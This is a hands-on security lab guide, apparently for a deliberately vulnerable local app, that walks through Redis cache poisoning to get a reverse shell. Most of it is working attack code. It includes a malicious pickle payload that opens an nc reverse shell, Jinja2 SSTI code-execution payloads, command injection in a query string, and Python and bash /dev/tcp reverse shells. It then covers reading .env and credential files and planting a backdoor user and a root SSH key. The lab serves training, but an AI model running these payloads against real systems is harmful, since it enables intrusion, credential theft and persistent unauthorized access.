# Lab 06 - Poison Redis Cache and Deploy Reverse Shell

## Objective

Exploit a Redis cache poisoning vulnerability to inject malicious code and deploy a reverse shell to gain remote access to the application server.

## ⚠️ WARNING

This lab involves actual exploitation techniques. Only perform these actions on systems you own or have explicit permission to test. Unauthorized access to computer systems is illegal.

## Background

Redis cache poisoning occurs when:
1. User-controlled data is cached without proper validation
2. Cached data is later deserialized and executed
3. An attacker can inject malicious payloads into the cache
4. The application executes the malicious code when retrieving cached data

Common attack vectors:
- Python pickle deserialization
- Template injection in cached templates
- Command injection via cached data
- Server-Side Template Injection (SSTI)

## Prerequisites

- Completed previous labs
- Understanding of reverse shells
- `netcat` (`nc`) installed
- Knowledge of your local IP address

## Reconnaissance

### 1. Identify Redis Usage

Review the source code (from Lab 04) to understand how Redis is used:

```bash
# Search for Redis operations
grep -n "redis" app.py
grep -n "cache" app.py
grep -n "pickle" app.py
```

Look for:
- How data is stored in Redis (`redis.set()`)
- How data is retrieved from Redis (`redis.get()`)
- Whether pickle is used for serialization
- Whether user input affects cached data

### 2. Check Your IP Address

You'll need your IP for the reverse shell:

```bash
# macOS/Linux
ipconfig getifaddr en0  # WiFi
# or
ifconfig | grep "inet " | grep -v 127.0.0.1
```

Note your IP address (e.g., `192.168.1.100`)

### 3. Test Redis Connectivity

Try to connect to Redis directly (if exposed):

```bash
# Check if Redis port is exposed
nc -zv localhost 6379

# Try to connect with redis-cli (if installed)
redis-cli -h localhost -p 6379 ping
```

## Attack Scenarios

### Scenario A: Pickle Deserialization Attack

If the application uses pickle to serialize/deserialize cached objects:

#### 1. Create Malicious Pickle Payload

Create a Python script to generate a malicious pickle:

```python
# malicious_pickle.py
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc YOUR_IP 4444 > /tmp/f')
        return os.system, (cmd,)

# Serialize the malicious object
payload = pickle.dumps(RCE())
print("Base64 payload:")
print(base64.b64encode(payload).decode())
```

Replace `YOUR_IP` with your actual IP address.

#### 2. Run the Payload Generator

```bash
python3 malicious_pickle.py
```

Copy the base64 output.

#### 3. Inject into Redis Cache

Find an endpoint that caches user data:

```bash
# Example: If the app caches resume data
curl -X POST http://localhost:8080/upload \
  -F "resume=@evil.txt" \
  -F "user_id=admin"
```

Or directly inject into Redis (if accessible):

```bash
redis-cli -h localhost set "cache:user:admin" "YOUR_BASE64_PAYLOAD"
```

#### 4. Set Up Listener

Before triggering the payload, set up a netcat listener:

```bash
# Terminal 1: Start listener
nc -lvnp 4444
```

#### 5. Trigger the Payload

Access the endpoint that retrieves cached data:

```bash
# Terminal 2: Trigger deserialization
curl http://localhost:8080/profile/admin
```

If successful, you should get a shell in Terminal 1!

### Scenario B: Server-Side Template Injection (SSTI)

If the application caches and renders templates:

#### 1. Test for SSTI

Try template injection payloads:

```bash
# Jinja2 SSTI test
curl -X POST http://localhost:8080/upload \
  -d "name={{7*7}}"

# Check if output shows 49 instead of {{7*7}}
```

#### 2. Escalate to RCE

If SSTI is confirmed, escalate to code execution:

```bash
# Jinja2 RCE payload
PAYLOAD="{{ ''.__class__.__mro__[1].__subclasses__()[396]('whoami', shell=True, stdout=-1).communicate()[0].strip() }}"

curl -X POST http://localhost:8080/upload \
  -d "name=$PAYLOAD"
```

#### 3. Deploy Reverse Shell via SSTI

```bash
# Reverse shell payload
PAYLOAD="{{ ''.__class__.__mro__[1].__subclasses__()[396]('nc YOUR_IP 4444 -e /bin/sh', shell=True) }}"

# Start listener
nc -lvnp 4444

# Inject payload
curl -X POST http://localhost:8080/upload \
  -d "name=$PAYLOAD"
```

### Scenario C: Cache Key Injection

If you can control cache keys:

#### 1. Identify Cache Key Structure

```bash
# Test different cache keys
redis-cli --scan --pattern "cache:*"
```

#### 2. Inject Malicious Key

```bash
# Inject command into cache key
curl "http://localhost:8080/api/data?id=1; nc YOUR_IP 4444 -e /bin/sh"
```

## Step-by-Step Exploitation Guide

### Complete Attack Chain

1. **Start Listener**
```bash
# Terminal 1
nc -lvnp 4444
```

2. **Identify Injection Point**
```bash
# Test various endpoints for cache behavior
curl -v http://localhost:8080/upload -F "file=@test.txt"
curl -v http://localhost:8080/profile/test
curl -v "http://localhost:8080/api/search?q=test"
```

3. **Craft Payload**
```bash
# Based on the vulnerability found, craft appropriate payload
# Example for pickle deserialization:
python3 malicious_pickle.py > payload.txt
```

4. **Inject Payload**
```bash
# Inject via the vulnerable endpoint
curl -X POST http://localhost:8080/vulnerable-endpoint \
  -H "Content-Type: application/json" \
  -d '{"data": "YOUR_PAYLOAD"}'
```

5. **Trigger Execution**
```bash
# Access the cached data to trigger deserialization
curl http://localhost:8080/trigger-endpoint
```

6. **Verify Shell Access**
```bash
# In your listener terminal, you should now have a shell
# Try commands:
whoami
id
pwd
ls -la
```

## Post-Exploitation

Once you have shell access:

### 1. Enumerate the Environment

```bash
# Check user
whoami
id

# Check operating system
uname -a
cat /etc/os-release

# Check network
ip addr
netstat -tulpn

# Check running processes
ps aux
```

### 2. Find Sensitive Data

```bash
# Look for configuration files
cat /app/config.py
cat /app/.env
cat /etc/nginx/nginx.conf

# Check environment variables
env

# Look for database credentials
grep -r "password" /app/
grep -r "DATABASE" /app/
```

### 3. Access Redis Data

```bash
# Connect to Redis
redis-cli

# List all keys
KEYS *

# Get specific cached data
GET cache:sessions:admin
```

### 4. Lateral Movement

```bash
# Check other containers
docker ps

# Check network
nmap -sn 172.17.0.0/24
```

### 5. Establish Persistence

```bash
# Create a backdoor user (if you have privileges)
useradd -m backdoor -s /bin/bash
echo "backdoor:password123" | chpasswd

# Add SSH key (if SSH is available)
mkdir -p /root/.ssh
echo "YOUR_SSH_PUBLIC_KEY" >> /root/.ssh/authorized_keys
```

## Verification

- [ ] Successfully identified cache poisoning vulnerability
- [ ] Created malicious payload
- [ ] Injected payload into Redis cache
- [ ] Triggered payload execution
- [ ] Obtained reverse shell
- [ ] Enumerated the compromised system
- [ ] Documented the attack chain

## Troubleshooting

### Reverse Shell Won't Connect

```bash
# Check firewall
# Try different ports (e.g., 443, 80, 8080)

# Try different reverse shell methods
# Python reverse shell:
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Bash reverse shell:
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
```

### Payload Not Executing

```bash
# Verify payload was cached
redis-cli GET "cache:key"

# Check application logs
docker logs resumecrunch-app

# Verify deserialization is happening
# Add debug output to trace execution
```

### Shell is Unstable

```bash
# Upgrade to a better shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background process with Ctrl+Z, then:
stty raw -echo; fg

# Set terminal
export TERM=xterm-256color
```

## Documentation Template

Document your successful exploit:

```markdown
# Redis Cache Poisoning Exploit Report

## Vulnerability Summary
- **Type**: Redis Cache Poisoning via [Pickle/SSTI/etc]
- **Severity**: Critical
- **Impact**: Remote Code Execution

## Attack Chain
1. [Step 1]
2. [Step 2]
3. [Step 3]

## Exploitation Steps
[Detailed commands used]

## Proof of Concept
[Screenshots or command output]

## Recommendations
1. Sanitize all user input before caching
2. Avoid using pickle for serialization
3. Implement input validation
4. Use Redis authentication
5. Restrict Redis network access

## References
- [CVE if applicable]
- [Related research]
```

## Learning Outcomes

By completing this lab, you have learned:
- How Redis cache poisoning works
- Techniques for exploiting deserialization vulnerabilities
- How to deploy reverse shells
- Post-exploitation enumeration techniques
- The importance of input validation and secure serialization

## Next Steps

With the lab complete, review:
- [Security Best Practices](security-best-practices.md)
- [Vulnerabilities Documentation](vulnerabilities.md)

Document your findings and prepare a remediation plan.

---

[← Previous: Test for Vulnerabilities](lab-05-test-vulns.md) | [Back to Lab Overview](lab-overview.md)
